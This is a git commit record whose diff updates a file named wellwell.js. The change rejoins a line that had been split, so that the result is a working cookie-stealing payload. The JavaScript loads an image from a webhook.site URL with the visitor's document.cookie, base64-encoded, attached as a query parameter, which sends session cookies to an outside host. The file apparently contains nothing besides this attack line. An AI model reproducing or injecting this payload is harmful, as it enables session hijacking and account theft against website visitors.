d6eb342cd94f5ce5e7ddad289b1647caf1dbfe8d
September <salbibar@gmail.com>
2024-09-24 19:45:05 +0300

    Update wellwell.js

--- wellwell.js
+++ wellwell.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/64d1a346-7409-4563-9a18-e290abe03899?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/64d1a346-7409-4563-9a18-e290abe03899?data='+btoa(document.cookie);
